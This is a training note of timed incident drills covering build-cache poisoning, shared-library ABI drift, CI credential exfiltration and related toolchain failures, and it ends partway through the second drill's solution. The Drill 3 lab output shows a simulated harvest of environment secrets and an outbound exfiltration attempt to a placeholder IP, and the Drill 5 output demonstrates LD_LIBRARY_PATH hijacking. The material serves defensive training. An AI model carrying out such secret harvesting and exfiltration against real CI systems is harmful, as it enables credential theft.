---
type: problem
track: [sde, distinguished, low-latency, quant-dev]
level:
status: solid
last_reviewed:
sources:
  - "The Bazel Authors, Remote Execution API v2 (REAPI), Linux Foundation and Google, 2026, https://github.com/bazelbuild/remote-apis"
  - "The SLSA Authors, Supply-chain Levels for Software Artifacts (SLSA) Specification v1.2, OpenSSF, 2026, https://slsa.dev/spec/v1.2/"
  - "Ulrich Drepper, How To Write Shared Libraries, Red Hat Inc., 2011, https://www.akkadia.org/drepper/dsohowto.pdf"
  - "Michael Matz, Jan Hubicka, Andreas Jaeger, Mark Mitchell, and H.J. Lu, System V Application Binary Interface: AMD64 Architecture Processor Supplement (Draft Version 1.0), GitLab x86-psABIs, 2024, https://gitlab.com/x86-psABIs/x86-64-ABI"
  - "Itanium C++ ABI Consortium, Itanium C++ ABI (Revision: 1.89), itanium-cxx-abi.github.io, 2026, https://itanium-cxx-abi.github.io/cxx-abi/abi.html"
  - "Dodji Seketeli, Libabigail: The Application Binary Interface Generic Analysis and Instrumentation Library (abidiff manual), sourceware.org, 2026, https://sourceware.org/libabigail/manual/abidiff.html"
  - "Michael Kerrisk et al., ld.so(8): dynamic linker/loader, Linux man-pages project, 2026, https://man7.org/linux/man-pages/man8/ld.so.8.html"
  - "Free Software Foundation, Using LD, the GNU linker: Command-line Options (--enable-new-dtags, --disable-new-dtags, -soname), sourceware.org, 2026, https://sourceware.org/binutils/docs/ld/Options.html"
  - "Tokio Project, tokio::runtime::Builder and worker threads, docs.rs, 2026, https://docs.rs/tokio/latest/tokio/runtime/struct.Builder.html"
  - "Tokio Project, tokio-console: A diagnostic and debugging tool for asynchronous Rust programs, GitHub, 2026, https://github.com/tokio-rs/console"
  - "Python Software Foundation, asyncio: Developing with asyncio, Python 3 documentation, 2026, https://docs.python.org/3/library/asyncio-dev.html"
  - "Python Software Foundation, faulthandler: Dump the Python traceback, Python 3 documentation, 2026, https://docs.python.org/3/library/faulthandler.html"
  - "Scott Chacon and Ben Straub, Pro Git, 2nd Edition (Chapter 10: Git Internals), Apress, 2014, https://git-scm.com/book/en/v2/Git-Internals-Git-Objects"
  - "Git Community, git-fsck(1): Verifies the connectivity and validity of the objects in the database, git-scm.com, 2026, https://git-scm.com/docs/git-fsck"
  - "Git Community, git-index-pack(1): Build pack index file for an existing packed archive, git-scm.com, 2026, https://git-scm.com/docs/git-index-pack"
  - "The Bazel Authors, remote_execution.proto (Action, ExecutedActionMetadata, ActionCache.UpdateActionResult), GitHub, 2026, https://raw.githubusercontent.com/bazelbuild/remote-apis/main/build/bazel/remote/execution/v2/remote_execution.proto"
  - "The Bazel Authors, Command-Line Reference (--guard_against_concurrent_changes, --remote_accept_cached, --remote_upload_local_results, --sandbox_debug), bazel.build, 2026, https://bazel.build/reference/command-line-reference"
  - "The SLSA Authors, What's new in SLSA v1.2 (Source Track), OpenSSF, 2026, https://slsa.dev/spec/v1.2/whats-new"
  - "Tokio Project, tokio-console README (columns, lints, default address, tokio_unstable), GitHub, 2026, https://github.com/tokio-rs/console/blob/main/tokio-console/README.md"
  - "Rust Project, Clippy lint list (await_holding_lock, await_holding_refcell_ref), clippy.rust-lang.org, 2026, https://clippy.rust-lang.org/master/index.html"
  - "Rust Project, cargo-generate-lockfile(1), cargo-update(1), cargo-tree(1), The Cargo Book, 2026, https://doc.rust-lang.org/cargo/commands/cargo-update.html"
  - "Python Software Foundation, site: Site-specific configuration hook (.pth files), Python 3 documentation, 2026, https://docs.python.org/3/library/site.html"
  - "GitHub, GITHUB_TOKEN (Actions concepts: expiry and maximum lifetime), GitHub Docs, 2026, https://docs.github.com/en/actions/concepts/security/github_token"
  - "NixOS Contributors, patchelf (--set-rpath and --force-rpath, src/patchelf.cc), GitHub, 2026, https://github.com/NixOS/patchelf"
  - "Amazon Web Services, GuardDuty IAM finding types (InstanceCredentialExfiltration.InsideAWS and .OutsideAWS), AWS documentation, 2026, https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html"
  - "GitHub, REST API endpoints for revoking credentials (POST /credentials/revoke), GitHub Docs, 2026, https://docs.github.com/en/rest/credentials/revoke"
  - "GitHub, Workflow syntax for GitHub Actions (jobs.<job_id>.services), GitHub Docs, 2026, https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions"
  - "Docker Inc., Compose file reference: services (network_mode), Docker Docs, 2026, https://docs.docker.com/reference/compose-file/services/#network_mode"
  - "The Kubernetes Authors, Liveness, Readiness, and Startup Probes, kubernetes.io, 2026, https://kubernetes.io/docs/concepts/configuration/liveness-readiness-startup-probes/"
---

# Production Incident Simulation Drills

> [!summary] Scope
> This drill bank provides six timed, highly realistic production incident drills that simulate catastrophic toolchain and infrastructure failures under emergency conditions.
> Scenarios cover corrupted build cache poisoning, silent shared-library ABI drift causing SIGSEGV in production, compromised CI dependency exfiltration, and hung asynchronous runtimes.
> Each drill features runnable reproduction setups in code/, strict time constraints, progressive diagnostic reveals, and verified recovery procedures.

In high-reliability engineering environments, toolchain failures during active production incidents represent the most dangerous class of outages.
When an emergency deployment stalls because the build system serves a poisoned binary from remote cache, or when a shared-library upgrade silently breaks memory layout across dynamic linker boundaries, conventional application monitoring fails.
Standard application logs report generic crashes or timeouts, while the underlying cause lies deep within the dynamic loader, compiler optimization passes, asynchronous executors, or content-addressable storage networks.
Distinguished and staff engineers must possess the diagnostic fluency to stabilize the system, isolate low-level root causes under strict time constraints, execute emergency hotfixes, and establish preventative architectural guardrails.

This drill bank establishes six timed incident drills simulating enterprise-scale toolchain emergencies.
The scenarios mirror real-world catastrophes encountered across high-frequency trading engines, distributed cloud platforms, and large-scale CI/CD fleets.
The theoretical foundations of remote execution caching are owned by [[Remote-Execution-API-and-Remote-Caching]].
Shared library versioning and dynamic linking mechanics are owned by [[Cpp-ABI-Stability-Symbol-Visibility-and-SONAME]] and [[Diagnose-Dynamic-Linker-and-ABI-Failures]].
Supply-chain attestation and dependency containment are owned by [[Respond-to-a-Compromised-Transitive-Dependency]] and [[SLSA-Framework-Build-and-Source-Tracks]].
Asynchronous runtime execution models are owned by [[Rust-Async-Debugging-tokio-console-and-tracing]] and [[Python-Concurrency-Asyncio-Multiprocessing-and-Free-Threading-Bugs]].
Git storage internals and object rescue are owned by [[Git-Object-Model-and-Content-Addressing]] and [[Repair-a-Corrupted-Git-Repository]].
This problem note owns the timed, end-to-end incident command simulations that integrate these domains under fire.

```mermaid
flowchart TD
    subgraph INCIDENT_COMMAND["Emergency Incident Command Protocol"]
        DETECT["T+0m: PagerDuty Alert Triggered<br/>Service Degraded / Production Outage"]
        TRIAGE["T+5m: Incident Commander Assembled<br/>Blast-Radius Assessment & Canary Shedding"]
        ISOLATE["T+15m: Technical Lead Forensics<br/>Trace Core Dumps, Linker Maps & Cache Keys"]
        REMEDIATE["T+30m: Emergency Hotfix / Rollback<br/>Bypass Corrupted Artifacts & Patch Binary"]
        VERIFY["T+45m: Automated Canary Verification<br/>Zero Regressions, Telemetry Normalized"]
        POSTMORTEM["T+24h: Paved-Road Hardening<br/>Hermetic Sandboxing, ABI Diff Gating & SBOMs"]
    end

    DETECT --> TRIAGE
    TRIAGE --> ISOLATE
    ISOLATE --> REMEDIATE
    REMEDIATE --> VERIFY
    VERIFY --> POSTMORTEM
```

---

## Reproduction

The complete, automated test harness backing these simulation drills is located in `code/11-Arena-and-Capstones/incident_sim_drills/`.
To execute the automated verification suite across all six drills:

```bash
cd code/11-Arena-and-Capstones/incident_sim_drills
bash run.sh
```

Because the suite compiles native shared objects using ELF-specific linker flags (`-Wl,-soname`, `-Wl,--enable-new-dtags`, and `-Wl,-rpath`), inspects dynamic loader semantics (`ld.so`), and executes POSIX process signals, the lab specifies `# requires: linux`.
When executed on non-Linux hosts through the test harness (`python3 -m _harness.verify`), it executes inside a container running Ubuntu 24.04 with GCC 13.3.0 and GNU ld 2.42 (measured on linux-aarch64 as of 2026-11).

| File | Subsystem Under Test | Reproduction Role |
| :--- | :--- | :--- |
| `run.sh` | Orchestration Harness | Master driver executing all six scenario verification scripts sequentially. |
| `drill1_cache_poison.py` | Remote Execution & CAS | Pure-Python model of an Action Cache: a poisoned entry under a clean digest is served, then rejected by a builder-identity allowlist (no real REAPI server or signature check). |
| `market_v1.h` / `market_v2_broken.h` | C++ Shared Library ABI | Baseline 24-byte struct layout versus drifted 32-byte layout with unbumped SONAME. |
| `libmarket_v1.c` / `libmarket_v2.c` | Dynamic Shared Object | Implementation of batch processing functions demonstrating out-of-bounds struct writes. |
| `app.c` / `drill2_abi_drift.sh` | Dynamic Linker (`ld.so`) | Downstream client verifying memory canary corruption when running against drifted DSO. |
| `drill3_exfiltration.py` | Supply Chain & Build Sandboxing | Prints a simulated credential harvest from a fake environment and a simulated egress block; it opens no socket and creates no network namespace. |
| `drill4_async_starvation.py` | Asynchronous Runtime Loop | Measures event loop lag spike caused by synchronous blocking operations and verifies thread pool offloading. |
| `math_hermetic.c` / `math_system.c` | ELF Dynamic Tags | Compares version outputs across hermetic (`$ORIGIN`) and system libraries. |
| `main_math.c` / `drill5_rpath_runpath.sh` | Linker Interposition | Proves `LD_LIBRARY_PATH` overrides `DT_RUNPATH` while `DT_RPATH` remains immune. |
| `drill6_git_corrupt.py` | Git Object Store | Corrupts a loose object, detects it with its own zlib and SHA-1 check (not `git fsck`), and reconstructs the zlib stream. |

---

## Observed Symptom

When these six incident scenarios strike in production environments, the initial symptoms appear as catastrophic disruptions across the observability dashboard:

```text
[PRODUCTION INCIDENT TELEMETRY DASHBOARD: CONSOLIDATED SYMPTOMS]

DRILL 1 (Build Cache Poisoning):
- Service: order-gateway-prod (Canary Deployment, Pods 40-49)
- Telemetry: SIGSEGV crash loop on pod startup (exit code 139).
- Anomaly: Pods 0-39 (built locally or on clean worker) run cleanly; Pods 40-49 (cached build) crash.
- Git Commit: Exactly identical SHA-1 hash across passing and failing pods.
- Binary Discrepancy: sha256sum /opt/firm/bin/order-gateway differs between build runners!

DRILL 2 (Shared-Library ABI Drift):
- Service: market-pricing-engine (Production Host cluster-nyc-08)
- Telemetry: Segmentation fault (SEGV_MAPERR at 0xdeadbeefcafe0008, ip 0x7f98b21045a2).
- Anomaly: Occurred 4 minutes after zero-downtime rolling update of libmarket.so.1.
- Dynamic Linker: ld.so reported exit status 0 during DSO loading; no unresolved symbols.
- Heap State: Allocator chunk headers smashed; canary variable 0xCAFEBABE12345678 overwritten.

DRILL 3 (Compromised CI Exfiltration):
- Service: Continuous Integration Pipeline (Runner Pool runners-linux-x86-highcpu)
- Telemetry: Cloud SIEM alert: Outbound TCP SYN packet to unauthorized external IP 198.51.100.42:443.
- Process Tree: runner-agent -> docker -> cargo -> build-script-build -> curl / raw socket.
- Secret Exposure: AWS_SECRET_ACCESS_KEY and GITHUB_TOKEN accessed during build execution.

DRILL 4 (Asynchronous Runtime Starvation):
- Service: websocket-feed-handler (Rust Tokio / Python asyncio)
- Telemetry: Ingress message latency p999 spikes from 1.2ms to 48,200ms; HTTP 504 Gateway Timeouts.
- CPU Utilization: Dropped to 0.0% on 31 cores; Core 3 pegged at 100% in uninterrupted syscall.
- Health Probes: Kubernetes liveness probe failed: connection refused after timeout.

DRILL 5 (Dynamic Linker Interposition):
- Service: risk-analytics-server (Linux x86_64 production fleet)
- Telemetry: Output pricing vectors reporting NaN and corrupt values; math calculation regression.
- Environmental Drift: Production host wrapper script set LD_LIBRARY_PATH=/usr/lib64.
- Library Resolution: readelf confirms binary was built with DT_RUNPATH; system library interposed.

DRILL 6 (Git Object Database Corruption):
- Service: Emergency Hotfix Release Automation (Deployment Pipeline)
- Telemetry: git push failing on all production runners (pack-objects dies with exit code 128; git push exits 1).
- Error Output: fatal: loose object 709fde956aa5a6f2b37b18c1234442cfe481e1e7 (stored in .git/objects/70/9fde956aa5a6f2b37b18c1234442cfe481e1e7) is corrupt
- Blockage: Production deployment halted during active P0 market volatility event.
```

The deterministic execution output from the containerized verification suite demonstrates the exact reproduction and remediation mechanics (lab output, linux-aarch64):

```text
==================================================================
RUNNING DRILL 1: REMOTE BUILD CACHE POISONING VERIFICATION
==================================================================
[DRILL 1] Initializing Remote Execution Action Cache...
[DRILL 1] Legitimate Action Digest: 7f5ed311aea1c831...
[DRILL 1] Poisoned ActionResult injected into Action Cache by unhardened worker.
[DRILL 1] Clean CI Runner querying Action Cache for build...
[DRILL 1] ACTION_CACHE_HIT: Retrieved cached engine.o (0858ca4ee75f77c0...)
[DRILL 1] DETECTED: Poisoned object file found in remote cache!
[DRILL 1] Applying Fix: SLSA v1.2 Cryptographic Action Verification & Strict Sandboxing...
[DRILL 1] REJECTED: Builder 'worker-pool-us-east-412' lacks verified cryptographic provenance signature.
[DRILL 1] EVICTED: Poisoned ActionDigest purged from remote cache.
[DRILL 1] SUCCESS: Hermetic compilation restored clean cache entry.
==================================================================
RUNNING DRILL 2: SHARED-LIBRARY ABI DRIFT & MEMORY CORRUPTION
==================================================================
[DRILL 2] Compiling libmarket.so.1 (v1 baseline)...
[DRILL 2] Compiling app against market_v1.h...
[DRILL 2] Running app against v1 DSO:
[DRILL 2] Client binary compiled against v1 headers (sizeof Order: 24 bytes)
[DRILL 2] SUCCESS: Canary intact (0xCAFEBABE12345678)
[DRILL 2] Compiling upgraded libmarket_v2.so (32-byte layout, UNBUMPED SONAME libmarket.so.1)...
[DRILL 2] Running unmodified app against silently drifted v2 DSO:
[DRILL 2] Client binary compiled against v1 headers (sizeof Order: 24 bytes)
[DRILL 2] ABI_CORRUPTION_DETECTED: Canary corrupted! Expected 0xCAFEBABE12345678, found 0xAA55AA55AA55AA55
[DRILL 2] Expected memory corruption detected by client (exit code 1).
[DRILL 2] Applying Remediation: Bumping SONAME to libmarket.so.2...
[DRILL 2] Restored libmarket.so.1 for legacy client; app runs cleanly:
[DRILL 2] Client binary compiled against v1 headers (sizeof Order: 24 bytes)
[DRILL 2] SUCCESS: Canary intact (0xCAFEBABE12345678)
[DRILL 2] SUCCESS: Drill 2 ABI drift isolation and remediation verified.
==================================================================
RUNNING DRILL 3: COMPROMISED DEPENDENCY CREDENTIAL EXFILTRATION
==================================================================
[DRILL 3] --- SIMULATING UNHARDENED CI BUILD RUNNER ---
[DRILL 3] MALICIOUS_PAYLOAD: Harvested 3 secrets from environment:
  - AWS_ACCESS_KEY_ID: AKIAIOSF...
  - AWS_SECRET_ACCESS_KEY: wJalrXUt...
  - GITHUB_TOKEN: ghp_EXAM...
[DRILL 3] MALICIOUS_PAYLOAD: Attempting outbound exfiltration to https://198.51.100.42:443/collect...
[DRILL 3] VULNERABILITY_CONFIRMED: Runner permitted outbound network socket during build step!

[DRILL 3] --- SIMULATING HARDENED SANDBOXED RUNNER (REMEDIATION) ---
[DRILL 3] HARVEST_CHECK: Found 0 credentials in build environment (Hermetic Secret Scoping).
[DRILL 3] EGRESS_FILTER: Connection to 198.51.100.42:443 BLOCKED by network sandbox (ENETUNREACH / EPERM).
[DRILL 3] AUDIT_EVENT: Alert dispatched to SOC: unauthorized egress attempt trapped in build sandbox.
[DRILL 3] SUPPLY_CHAIN_POLICY: Enforcing cargo --locked and pip --require-hashes.
[DRILL 3] SUCCESS: Drill 3 exfiltration containment verified.
==================================================================
RUNNING DRILL 4: ASYNC RUNTIME THREAD POOL STARVATION
==================================================================
[DRILL 4] --- SIMULATING EVENT LOOP BLOCKING (FLAWED CODE) ---
[DRILL 4] MEASURED_LOOP_LAG: EXCEEDED_THRESHOLD (mean lag > 20.00 ms)
[DRILL 4] STARVATION_CONFIRMED: Event loop thread stalled! Health checks timed out.

[DRILL 4] --- SIMULATING REMEDIATED RUNTIME (THREAD POOL OFFLOAD) ---
[DRILL 4] MEASURED_LOOP_LAG: WITHIN_SLA (mean lag < 10.00 ms)
[DRILL 4] SUCCESS: Event loop remained fully responsive during background execution.
==================================================================
RUNNING DRILL 5: DYNAMIC LINKER RPATH VS RUNPATH INTERPOSITION
==================================================================
[DRILL 5] Bare -Wl,-rpath on this toolchain emits: (RUNPATH)
[DRILL 5] Compiling app_runpath with DT_RUNPATH (--enable-new-dtags)...
[DRILL 5] app_runpath dynamic tags: (RUNPATH)
[DRILL 5] Case A1: Clean environment (no LD_LIBRARY_PATH):
[DRILL 5] Engine Version Resolved: 202611
[DRILL 5] SUCCESS: Hermetic library resolved correctly (202611).
[DRILL 5] Case A2: Tainted environment with LD_LIBRARY_PATH=lib_system:
[DRILL 5] Engine Version Resolved: 201801
[DRILL 5] INTERPOSITION_DETECTED: System library hijacked resolution (201801)!
[DRILL 5] Expected symbol interposition occurred (LD_LIBRARY_PATH took precedence over DT_RUNPATH).
[DRILL 5] Compiling app_rpath with DT_RPATH (--disable-new-dtags)...
[DRILL 5] app_rpath dynamic tags: (RPATH)
[DRILL 5] Case B1: Tainted environment with LD_LIBRARY_PATH=lib_system against DT_RPATH:
[DRILL 5] Engine Version Resolved: 202611
[DRILL 5] SUCCESS: Hermetic library resolved correctly (202611).
[DRILL 5] SUCCESS: DT_RPATH immune to LD_LIBRARY_PATH hijacking.
==================================================================
RUNNING DRILL 6: CORRUPTED GIT OBJECT RESCUE UNDER P0 EMERGENCY
==================================================================
[DRILL 6] Initializing clean Git repository structure...
[DRILL 6] Hotfix blob object SHA-1: 709fde956aa5a6f2b37b18c1234442cfe481e1e7
[DRILL 6] Valid Git loose object stored at objects/70/9fde956aa5a6f2b37b18c1234442cfe481e1e7
[DRILL 6] Injecting filesystem corruption into loose object: 70/9fde956aa5a6f2b37b18c1234442cfe481e1e7...
[DRILL 6] Executing diagnostic object integrity check...
[DRILL 6] FSCK_ERROR_DETECTED: error in loose object 709fde956aa5a6f2b37b18c1234442cfe481e1e7: inflate: data stream error (Error -3 while decompressing data: incorrect header check)
[DRILL 6] Applying Recovery: Reconstructing Git loose object from working copy...
[DRILL 6] Loose object reconstructed and re-compressed with zlib.
[DRILL 6] POST_RECOVERY_CHECK: SHA-1 matches (709fde956aa5a6f2...). Object valid.
[DRILL 6] SUCCESS: Git repository integrity restored! 0 errors detected.
==================================================================
ALL SIX DRILL VERIFICATIONS COMPLETED SUCCESSFULLY
==================================================================
```

The harness scrubs every 8-to-16-digit hex value to `0xADDR` in `expected/linux-aarch64.txt`, so the canary values above come from an unscrubbed run of the same lab in the same image (2026-11-27).

---

## The Six Production Incident Simulation Drills

### Drill 1: Remote Action Cache Poisoning and Undetected Nondeterministic Object Injection

#### 1. Incident Parameters and Context
- **Severity Classification:** P0 Outage (Production Crash Loop across Critical Services).
- **Time Constraint:** 45 minutes to containment and cache isolation.
- **Affected Subsystem:** Distributed Bazel/REAPI v2 Remote Build Cluster and Content Addressable Storage (CAS).
- **Business Impact:** 5% of trading gateway pods deployed from CI crash immediately upon receiving live order packets; clean local developer builds succeed without crashes.

#### 2. Incident Timeline
- `T+00m`: PagerDuty triggers alert `CRITICAL: order-gateway canary crash loop backoff`.
- `T+05m`: Incident Commander establishes call; on-call engineer checks git history; no code changes occurred between passing release v4.12.0 and failing v4.12.1 beyond a version string bump.
- `T+12m`: A developer builds `order-gateway` locally on macOS and Linux workstations; the binary passes all unit and integration tests.
- `T+22m`: Deploying the locally built binary to canary resolves the crash; deploying the CI-built artifact immediately reproduces the crash.
- `T+28m`: Technical Lead isolates the problem to the build artifact itself: binary inspection reveals different machine instructions despite identical source commits.

#### 3. Technical Root Cause Mechanism
Under the Remote Execution API v2 (REAPI), an execution action is keyed by the digest of its serialized `Action` protobuf message, computed with the digest function the server announces (SHA-256 is Bazel's default; the proto also defines SHA-1, SHA-384, SHA-512, BLAKE3, and others):

```protobuf
// remote_execution.proto, as of 2026-11
message Action {
  Digest command_digest = 1;
  Digest input_root_digest = 2;
  reserved 3 to 5; // moved to Command
  google.protobuf.Duration timeout = 6;
  bool do_not_cache = 7;
  reserved 8; // moved to Command
  bytes salt = 9;
  Platform platform = 10;
}
```

The `command_digest` points to a serialized `Command` containing command-line arguments and environment variables.
The `input_root_digest` points to a Merkle tree of `Directory` messages representing all input files declared by the build rule.
If a build rule has an undeclared header dependency (for example, reading a configuration file from `/tmp/sysconfig.h` or relying on an unrecorded system path), or if an unhardened execution worker contains a poisoned local header, the compiler includes that header without its hash being included in `input_root_digest`.
An unhardened worker compiled `engine.o` with an invalid memory offset and uploaded the resulting binary blob to CAS.
The worker wrote an `ActionResult` mapping the clean `ActionDigest` to the tainted object blob in CAS.
Subsequent builds on completely clean CI runners queried the Action Cache, received a cache hit for `ActionDigest`, downloaded the poisoned `engine.o` from CAS, linked it, and deployed a crashing binary to production.

#### 4. Progressive Hint Ladder

> [!tip]- Hint 1: Compare the disassembly of the local binary and the CI binary
> Run `objdump -d` or `diffoscope` on the passing local binary versus the crashing CI artifact.
> Identify which compilation unit (`.o`) contains diverging instructions.
> Inspect the `.comment` section (`readelf -p .comment binary`) to see compiler version flags.

> [!tip]- Hint 2: Query the remote Action Cache directly for the action digest
> Extract the command line and inputs for the failing compilation unit using `bazel aquery 'mnemonic("CppCompile", //services/gateway:engine)'`.
> Compute the `ActionDigest` and query the remote cache via gRPC or CLI to inspect the `ActionResult`.
> Check `execution_metadata.worker` (the `ExecutedActionMetadata.worker` field) in the cached result.

> [!tip]- Hint 3: Check for undeclared dependencies and host path leakage
> Inspect the compiler include flags: are there `-I` or `-isystem` paths pointing to system directories or `/tmp`?
> Verify if `-fdebug-prefix-map` or `-no-canonical-prefixes` was omitted, allowing absolute paths to alter debug symbols or preprocessor definitions.
> Check if `--spawn_strategy=remote,sandboxed` was degraded to `standalone` on an unhardened worker pool.

#### 5. Model Solution

> [!success]- Solution
> **Phase 1: Rapid Containment (T+30m)**
> Immediately decouple the deployment pipeline from the corrupted remote cache.
> In Bazel, invoke the emergency hotfix build with remote caching disabled:
> ```bash
> bazel build //services/gateway:order-gateway \
>   --remote_accept_cached=false \
>   --remote_upload_local_results=false \
>   --spawn_strategy=sandboxed,local
> ```
> Deploy this freshly compiled, hermetic binary to production to halt the crash loop.
>
> **Phase 2: Forensic Root-Cause Isolation (T+35m)**
> Extract the specific `ActionDigest` for the failing unit using `bazel aquery`:
> ```bash
> bazel aquery 'mnemonic("CppCompile", //services/gateway:engine)' --output=proto > action.pb
> ```
> Query the Action Cache endpoint using the REAPI client:
> ```bash
> grpc_cli call remote-cache.prod:443 \
>   build.bazel.remote.execution.v2.ActionCache.GetActionResult \
>   "instance_name: 'prod' action_digest: {hash: '7f5ed311aea1c831...' size_bytes: 142}"
> ```
> The returned `ActionResult` names the execution worker `worker-pool-us-east-412` in `execution_metadata.worker`.
> Inspecting `worker-pool-us-east-412` reveals a rogue developer run executed with `--spawn_strategy=standalone` that left a modified `engine.h` in `/usr/local/include/engine.h`.
> Because `/usr/local/include` was in the system include path, GCC included the modified header without it being part of Bazel's declared `input_root_digest`.
>
> **Phase 3: Cache Invalidation and Eviction (T+40m)**
> Invalidate the poisoned action key across the remote cache cluster:
> ```bash
> # Evict the poisoned action result from the redis backend (key layout is specific to the cache server)
> redis-cli -h cache-kv.prod DEL "ac:prod:7f5ed311aea1c831..."
> # Invalidate downstream link action digest
> redis-cli -h cache-kv.prod DEL "ac:prod:9b2c8141beef0012..."
> ```
> Quarantine and terminate worker `worker-pool-us-east-412`.
>
> **Phase 4: Architectural Prevention (Postmortem)**
> 1. Enforce strict compiler hermeticity flags across all C++ toolchains:
>    ```text
>    -no-canonical-prefixes
>    -fdebug-prefix-map=<execroot>=.
>    -Wdate-time
>    -nostdinc
>    --sysroot=/opt/hermetic_sysroot
>    ```
> 2. Prohibit unhardened workers from uploading to the shared Action Cache:
>    Configure mutual TLS (mTLS) with cryptographically restricted API keys: only dedicated, ephemeral CI workers with verified SLSA v1.2 build provenance are authorized to execute `UpdateActionResult`.
>    All developer workstations are configured with `--remote_upload_local_results=false`.
> 3. Enable `--guard_against_concurrent_changes` (the current name of the former `--experimental_guard_against_concurrent_changes`, as of 2026-11) in CI, and use `--sandbox_debug` when investigating a sandbox escape.

#### 6. Core Takeaway
Build caches are content-addressed only over *declared* inputs; an undeclared dependency creates a cache key collision where corrupt outputs share an identical key with valid inputs.
See [[Remote-Execution-API-and-Remote-Caching]] and [[Compiler-Caches-ccache-and-sccache]].

---

### Drill 2: Silent Dynamic Shared-Library ABI Drift Causing SIGSEGV in Production

#### 1. Incident Parameters and Context
- **Severity Classification:** P0 Outage (Data Corruption and Core Dumps in Matching Engine).
- **Time Constraint:** 35 minutes to diagnose memory collision and roll back.
- **Affected Subsystem:** Dynamic Shared Object (`.so`) boundary and Linux Dynamic Linker (`ld.so`).
- **Business Impact:** High-frequency trading order gateway crashes with `SIGSEGV` immediately following a rolling upgrade of `libmarket.so.1`; order state in memory is corrupted.

#### 2. Incident Timeline
- `T+00m`: Service `order-matcher` crashes across all production nodes following the automated deployment of `libmarket.so.1.1.0`.
- `T+06m`: Systemd restarts `order-matcher`; process immediately terminates with signal 11 (`SIGSEGV`).
- `T+12m`: On-call engineer inspects dynamic linker logs: `ldd /opt/firm/bin/order-matcher` confirms `libmarket.so.1 => /usr/lib64/libmarket.so.1` resolved with status code 0.
- `T+18m`: GDB opens the generated core dump: the crash occurs inside `market_process_batch`, but the instruction pointer points to valid code.
- `T+25m`: Memory dumps reveal that adjacent heap variables and stack canary values are completely overwritten with `0xDEADBEEF...`.

#### 3. Technical Root Cause Mechanism
The shared library `libmarket.so.1` underwent a minor feature update where a developer added a new field to `struct Order`:

```c
// Baseline v1.0 Header (market_v1.h)
struct Order {
    uint64_t id;       /* offset 0 */
    double price;      /* offset 8 */
    uint32_t quantity; /* offset 16 */
    uint32_t pad;      /* offset 20 -> total size: 24 bytes */
};

// Drifted v2.0 Header (market_v2_broken.h)
struct Order {
    uint64_t id;               /* offset 0 */
    double price;              /* offset 8 */
    uint32_t quantity;         /* offset 16 */
    uint32_t flags;            /* offset 20 */
    uint64_t client_timestamp; /* offset 24 -> total size: 32 bytes */
};
```

The developer believed appending fields to the end of a C struct is backward-compatible because existing field offsets (`id`, `price`, `quantity`) did not change.
Crucially, the developer **did not bump the library SONAME** from `libmarket.so.1` to `libmarket.so.2`.
The calling application `order-matcher` was compiled against `market_v1.h` six months earlier.
When `order-matcher` was compiled, the compiler evaluated `sizeof(struct Order)` as `24` bytes.
It generated assembly instructions allocating stack buffers and indexing order arrays with hardcoded displacements:
`array[i]` was addressed at `base + i * 24`.
However, the upgraded `libmarket.so.1` was compiled with `sizeof(struct Order) == 32`.
When the caller runs `market_init_order(&orders[1], ...)`, it passes `base + 24`, and the v2 DSO writes `client_timestamp` at `base + 24 + 24 = base + 48`.
When `libmarket` executes `market_process_batch(orders, count)`, it indexes element `1` at `base + 1 * 32 = base + 32`.
It writes `client_timestamp` at offset `32 + 24 = 56`.
In the calling application, the allocated buffer for two orders was only `2 * 24 = 48` bytes!
The lab places a canary at offset 48 and observes it overwritten with the v2 `market_init_order` timestamp `0xAA55AA55AA55AA55`; the batch write at offset 56 lands past the client struct entirely.
The DSO's memory writes penetrated past the caller's allocated array bounds, destroying adjacent heap metadata, stack canaries, and local variables.
Because the SONAME remained `libmarket.so.1`, `ld.so` happily loaded the mismatched binary without a single warning.

#### 4. Progressive Hint Ladder

> [!tip]- Hint 1: Inspect structure layouts with pahole or GDB ptype /o
> Run `pahole -C Order libmarket.so.1` on both the old and new shared objects.
> Alternatively, load the core dump in GDB and issue `ptype /o struct Order`.
> Note the total byte size and the offset of each member.

> [!tip]- Hint 2: Check array indexing strides in the disassembly
> Disassemble the caller `order-matcher` at the call site of `market_process_batch`:
> Observe the multiplication factor or scale index used for array addressing (`lea (%rdi,%rax,8)`, etc.).
> Disassemble `market_process_batch` inside `libmarket.so.1` and compare the indexing displacement.

> [!tip]- Hint 3: Compare ELF symbol tables and ABI signatures with libabigail
> Run `abidiff --leaf-changes-only libmarket_v1.so libmarket_v2.so`.
> Observe the exact diagnostic output flagging the change in `struct Order` byte size and data member insertion.

#### 5. Model Solution

> [!success]- Solution
> **Phase 1: Immediate Triage and Rollback (T+15m)**
> Revert the symlink on the production host to restore the v1 shared object:
> ```bash
> ln -sf /opt/firm/lib/libmarket_v1.so /usr/lib64/libmarket.so.1
> ldconfig
> systemctl restart order-matcher
> ```
> Verify that `order-matcher` starts cleanly and canary values remain intact.
>
> **Phase 2: Deep Forensic Diagnostic (T+22m)**
> Extract the memory layout of `struct Order` as each side sees it.
> `pahole -C Order <binary>` and GDB `ptype /o struct Order` both print member offsets and the total size, but they need a binary built with `-g`.
> Not run in this lab (the image has no `dwarves`), so the layout below is computed by hand from `market_v1.h` and `market_v2_broken.h` with the standard AArch64 and x86-64 alignment rules, not captured tool output:
>
> | Member | Caller (v1 header) offset | Library (v2 header) offset |
> | --- | --- | --- |
> | `id` | 0 | 0 |
> | `price` | 8 | 8 |
> | `quantity` | 16 | 16 |
> | `pad` / `flags` | 20 | 20 |
> | `client_timestamp` | absent | 24 |
> | `sizeof(Order)` | 24 | 32 |
>
> Run `abidiff` to verify the ABI collision:
> ```bash
> abidiff --leaf-changes-only libmarket_v1.so libmarket_v2.so
> # Abridged shape of the report, following the examples in the abidiff manual; not run here (the lab image has no libabigail).
> # Needs DWARF, CTF, or BTF, else abidiff compares only ELF symbols.
> # A real run also appends the source location to each member line and reports the pad -> flags rename:
> # 'struct Order' changed:
> #   type size changed from 192 to 256 (in bits)
> #   1 data member insertion:
> #     'uint64_t client_timestamp', at offset 192 (in bits)
> ```
>
> **Phase 3: Remediation and Dual ABI Packaging (T+30m)**
> To safely roll out the new 32-byte layout without breaking existing binaries:
> 1. Bump the SONAME to `libmarket.so.2`:
>    ```bash
>    gcc -fPIC -shared -Wl,-soname,libmarket.so.2 -o libmarket.so.2.0.0 libmarket_v2.c
>    ```
> 2. Maintain `libmarket.so.1` side by side for legacy binaries.
